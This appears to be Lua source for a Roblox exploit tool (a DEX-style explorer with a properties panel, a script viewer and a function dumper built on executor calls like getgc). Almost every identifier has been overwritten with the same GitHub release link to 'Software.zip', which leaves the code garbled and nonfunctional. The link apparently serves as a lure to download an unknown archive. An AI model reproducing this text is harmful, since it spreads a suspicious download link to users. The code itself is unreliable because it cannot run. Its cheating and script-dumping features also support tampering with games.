			{3,"TextLabel",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,Font=3,Name="PropName",Parent={2},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,2,0,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-2,1,0),Text="Anchored",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),TextSize=14,TextTransparency=0.10000000149012,TextTruncate=1,TextXAlignment=0,}},
			{4,"TextButton",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,ClipsDescendants=true,Font=3,Name="Expand",Parent={2},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,-20,0,1),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,20,0,20),Text="",TextSize=14,Visible=false,}},
			{5,"ImageLabel",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,Image="rbxassetid://5642383285",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(144,16),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(16,16),Name="Icon",Parent={4},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,2,0,2),ScaleType=4,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,16,0,16),}},
			{6,"TextButton",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,BorderSizePixel=0,Font=4,Name="ToggleAttributes",Parent={2},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-85,0,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,85,0,22),Text="[SETTING: OFF]",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),TextSize=14,TextTransparency=0.10000000149012,Visible=false,}},
			{7,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.04313725605607,0.35294118523598,0.68627452850342),BackgroundTransparency=1,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.33725491166115,0.49019607901573,0.73725491762161),BorderSizePixel=0,Name="ValueFrame",Parent={1},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-100,0,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,80,1,0),}},
			{8,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.14117647707462,0.14117647707462,0.14117647707462),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.33725491166115,0.49019610881805,0.73725491762161),BorderSizePixel=0,Name="Line",Parent={7},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,-1,0,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,1,1,0),}},
			{9,"TextButton",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="ColorButton",Parent={7},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,20,0,22),Text="",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),TextSize=14,Visible=false,}},
			{10,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0),Name="ColorPreview",Parent={9},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,5,0,6),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,10,0,10),}},
			{11,"UIGradient",{Parent={10},}},
			{12,"Frame",{BackgroundTransparency=1,Name="EnumArrow",Parent={7},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-16,0,3),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,16,0,16),Visible=false,}},
			{13,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274510622025,0.86274510622025,0.86274510622025),BorderSizePixel=0,Parent={12},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,8,0,9),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,1,0,1),}},
			{14,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274510622025,0.86274510622025,0.86274510622025),BorderSizePixel=0,Parent={12},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,7,0,8),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,3,0,1),}},
			{15,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274510622025,0.86274510622025,0.86274510622025),BorderSizePixel=0,Parent={12},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,6,0,7),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,5,0,1),}},
			{16,"TextButton",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,Font=3,Name="ValueBox",Parent={7},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,4,0,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-8,1,0),Text="",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),TextSize=14,TextTransparency=0.10000000149012,TextTruncate=1,TextXAlignment=0,}},
			{17,"TextButton",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="RightButton",Parent={7},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-20,0,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,20,0,22),Text="...",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),TextSize=14,Visible=false,}},
			{18,"TextButton",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="SettingsButton",Parent={7},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-20,0,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,20,0,22),Text="",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),TextSize=14,Visible=false,}},
			{19,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,Name="SoundPreview",Parent={7},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,0,1,0),Visible=false,}},
			{20,"TextButton",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="ControlButton",Parent={19},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,20,0,22),Text="",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),TextSize=14,}},
			{21,"ImageLabel",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,Image="rbxassetid://5642383285",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(144,16),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(16,16),Name="Icon",Parent={20},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,2,0,3),ScaleType=4,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,16,0,16),}},
			{22,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.3137255012989,0.3137255012989,0.3137255012989),BorderSizePixel=0,Name="TimeLine",Parent={19},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,26,0.5,-1),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-34,0,2),}},
			{23,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.2352941185236,0.2352941185236,0.2352941185236),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.1294117718935,0.1294117718935,0.1294117718935),Name="Slider",Parent={22},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,-4,0,-8),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,8,0,18),}},
			{24,"TextButton",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="EditAttributeButton",Parent={1},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-20,0,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,20,0,22),Text="",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),TextSize=14,}},
			{25,"ImageLabel",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,Image="rbxassetid://5034718180",ImageTransparency=0.20000000298023,Name="Icon",Parent={24},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,2,0,3),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,16,0,16),}},
			{26,"TextButton",{AutoButtonColor=false,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.2352941185236,0.2352941185236,0.2352941185236),BorderSizePixel=0,Font=3,Name="RowButton",Parent={1},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,0,1,0),Text="Add Attribute",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),TextSize=14,TextTransparency=0.10000000149012,Visible=false,}},
		})

		local fullNameFrame = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
		local label = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,2,0,0)
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-4,1,0)
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = false
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = fullNameFrame
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(fullNameFrame)
	end

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function() -- TODO: MAKE BETTER
		local guiItems = create({
			{1,"Folder",{Name="Items",}},
			{2,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.20392157137394,0.20392157137394,0.20392157137394),BorderSizePixel=0,Name="ToolBar",Parent={1},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,0,0,22),}},
			{3,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.14901961386204,0.14901961386204,0.14901961386204),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.1176470592618,0.1176470592618,0.1176470592618),BorderSizePixel=0,Name="SearchFrame",Parent={2},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,3,0,1),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-6,0,18),}},
			{4,"TextBox",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,ClearTextOnFocus=false,Font=3,Name="SearchBox",Parent={3},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.39215689897537,0.39215689897537,0.39215689897537),PlaceholderText="Search properties",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,4,0,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-24,0,18),Text="",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),TextSize=14,TextXAlignment=0,}},
			{5,"UICorner",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,2),Parent={3},}},
			{6,"TextButton",{AutoButtonColor=false,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.12549020349979,0.12549020349979,0.12549020349979),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="Reset",Parent={3},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-17,0,1),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,16,0,16),Text="",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),TextSize=14,}},
			{7,"ImageLabel",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,Image="rbxassetid://5034718129",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.39215686917305,0.39215686917305,0.39215686917305),Parent={6},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,16,0,16),}},
			{8,"TextButton",{AutoButtonColor=false,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.12549020349979,0.12549020349979,0.12549020349979),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="Refresh",Parent={2},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-20,0,1),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,18,0,18),Text="",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),TextSize=14,Visible=false,}},
			{9,"ImageLabel",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,Image="rbxassetid://5642310344",Parent={8},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,3,0,3),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,12,0,12),}},
			{10,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.15686275064945,0.15686275064945,0.15686275064945),BorderSizePixel=0,Name="ScrollCorner",Parent={1},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-16,1,-16),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,16,0,16),Visible=false,}},
			{11,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,ClipsDescendants=true,Name="List",Parent={1},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0,23),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,0,1,-23),}},
		})

		-- Vars
		categoryOrder =  https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		for category,_ in next,categoryOrder do
			if not https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[category] then
				expanded["CAT_"https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip] = true
			end
		end
		expanded["https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip"] = true

		-- Init window
		window = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = window
		window:SetTitle("Properties")

		toolBar = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		propsFrame = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = toolBar
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = propsFrame

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()

		-- Window events
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("AbsoluteSize"):Connect(function()
			if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip() then
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
			end
		end)
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function()
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
		end)
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function()
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
		end)

		-- Init scrollbars
		scrollV = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()		
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 3
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-16,0,23)
		scrollV:SetScrollFrame(propsFrame)
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function()
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
		end)

		scrollH = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(true)
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 5
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 20
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,1,-16)
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function()
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
		end)

		-- Setup Gui
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0,22)
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
	end

	return Properties
end

return {InitDeps = initDeps, InitAfterMain = initAfterMain, Main = main}
end,
ScriptViewer = function()
--[[
	Script Viewer App Module
	
	A script viewer that is basically a notepad
]]

-- Common Locals
local Main,Lib,Apps,Settings -- Main Containers
local Explorer, Properties, ScriptViewer, Notebook -- Major Apps
local API,RMD,env,service,plr,create,createSimple -- Main Locals

local function initDeps(data)
	Main = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
	Lib = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
	Apps = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
	Settings = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

	API = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
	RMD = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
	env = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
	service = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
	plr = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
	create = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
	createSimple = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
end

local function initAfterMain()
	Explorer = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
	Properties = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
	ScriptViewer = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
	Notebook = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
end

local function main()
	local ScriptViewer = {}
	local window, codeFrame
	local PreviousScr = nil

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(scr)
		local success, source = pcall(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or function() end, scr)
		if not success or not source then source, PreviousScr = "-- DEX - Source failed to decompile", nil else PreviousScr = scr end
		codeFrame:SetText(source:gsub("\0", "\\0")) -- Fix stupid breaking script viewer
		window:Show()
	end

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function()
		window = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
		window:SetTitle("Script Viewer")
		window:Resize(500,400)
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = window

		codeFrame = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0,20)
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,0,1,-20)
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

		-- TODO: REMOVE AND MAKE BETTER
		local copy = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("TextButton",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 1
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.5,0,0,20)
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = "Copy to Clipboard"
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1)

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function()
			local source = codeFrame:GetText()
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(source)
		end)

		local save = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("TextButton",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 1
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.35,0,0,0)
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.3,0,0,20)
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = "Save to File"
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1)

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function()
			local source = codeFrame:GetText()
			local filename = "Place_"https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip["Run Service"]https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip"_Script_"https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()..".txt"

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(filename, source)
			if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(filename, ".txt")
			end
		end)

		local dumpbtn = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("TextButton",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 1
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.7,0,0,0)
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.3,0,0,20)
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = "Dump Functions"
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1)

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function()
			if PreviousScr ~= nil then
				pcall(function()
                    -- thanks https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip you'll obviously be credited (no discord tag since that can easily be impersonated)
                    local getgc = getgc or get_gc_objects
                    local getupvalues = (debug and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) or getupvalues or getupvals
                    local getconstants = (debug and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) or getconstants or getconsts
                    local getinfo = (debug and (https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)) or getinfo
                    local original = ("\n-- // Function Dumper made by https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip\n-- // Script Path: %s\n\n--[["):format(PreviousScr:GetFullName())
                    local dump = original
                    local functions, function_count, data_base = {}, 0, {}
                    function functions:add_to_dump(str, indentation, new_line)
                        local new_line = new_line or true
                        dump = dump .. ("%s%s%s"):format(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("    ", indentation), tostring(str), new_line and "\n" or "")
                    end
                    function functions:get_function_name(func)
                        local n = getinfo(func).name
                        return n ~= "" and n or "Unknown Name"
                    end
                    function functions:dump_table(input, indent, index)
                        local indent = indent < 0 and 0 or indent
                        functions:add_to_dump(("%s [%s] %s"):format(tostring(index), tostring(typeof(input)), tostring(input)), indent - 1)
                        local count = 0
                        for index, value in pairs(input) do
                            count = count + 1
                            if type(value) == "function" then
                                functions:add_to_dump(("%d [function] = %s"):format(count, functions:get_function_name(value)), indent)
                            elseif type(value) == "table" then
                                if not data_base[value] then
                                    data_base[value] = true
                                    functions:add_to_dump(("%d [table]:"):format(count), indent)
                                    functions:dump_table(value, indent + 1, index)
                                else
                                    functions:add_to_dump(("%d [table] (Recursive table detected)"):format(count), indent)
                                end
                            else
                                functions:add_to_dump(("%d [%s] = %s"):format(count, tostring(typeof(value)), tostring(value)), indent)
                            end
                        end
                    end
                    function functions:dump_function(input, indent)
                        functions:add_to_dump(("\nFunction Dump: %s"):format(functions:get_function_name(input)), indent)
                        functions:add_to_dump(("\nFunction Upvalues: %s"):format(functions:get_function_name(input)), indent)
                        for index, upvalue in pairs(getupvalues(input)) do
                            if type(upvalue) == "function" then
                                functions:add_to_dump(("%d [function] = %s"):format(index, functions:get_function_name(upvalue)), indent + 1)
                            elseif type(upvalue) == "table" then
                                if not data_base[upvalue] then
                                    data_base[upvalue] = true
                                    functions:add_to_dump(("%d [table]:"):format(index), indent + 1)
                                    functions:dump_table(upvalue, indent + 2, index)
                                else
                                    functions:add_to_dump(("%d [table] (Recursive table detected)"):format(index), indent + 1)
                                end
                            else
                                functions:add_to_dump(("%d [%s] = %s"):format(index, tostring(typeof(upvalue)), tostring(upvalue)), indent + 1)
                            end
                        end
                        functions:add_to_dump(("\nFunction Constants: %s"):format(functions:get_function_name(input)), indent)
                        for index, constant in pairs(getconstants(input)) do
                            if type(constant) == "function" then
                                functions:add_to_dump(("%d [function] = %s"):format(index, functions:get_function_name(constant)), indent + 1)
                            elseif type(constant) == "table" then
                                if not data_base[constant] then
                                    data_base[constant] = true
                                    functions:add_to_dump(("%d [table]:"):format(index), indent + 1)
                                    functions:dump_table(constant, indent + 2, index)
                                else
                                    functions:add_to_dump(("%d [table] (Recursive table detected)"):format(index), indent + 1)
                                end
                            else
                                functions:add_to_dump(("%d [%s] = %s"):format(index, tostring(typeof(constant)), tostring(constant)), indent + 1)
                            end
                        end
                    end
                    for _, _function in pairs(getgc()) do
                        if typeof(_function) == "function" and getfenv(_function).script and getfenv(_function).script == PreviousScr then
                            functions:dump_function(_function, 0)
                            functions:add_to_dump("\n" .. ("="):rep(100), 0, false)
                        end
                    end
                    local source = codeFrame:GetText()
                    if dump ~= original then source = source .. dump .. "]]" end
                    codeFrame:SetText(source)
                end)
            end
		end)
	end

	return ScriptViewer
end

return {InitDeps = initDeps, InitAfterMain = initAfterMain, Main = main}
end,
Lib = function()
--[[
	Lib Module
	
	Container for functions and classes
]]

-- Common Locals
local Main,Lib,Apps,Settings -- Main Containers
local Explorer, Properties, ScriptViewer, Notebook -- Major Apps
local API,RMD,env,service,plr,create,createSimple -- Main Locals

local function initDeps(data)
	Main = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
	Lib = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
	Apps = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
	Settings = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

	API = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
	RMD = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
	env = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
	service = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
	plr = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
	create = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
	createSimple = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
end

local function initAfterMain()
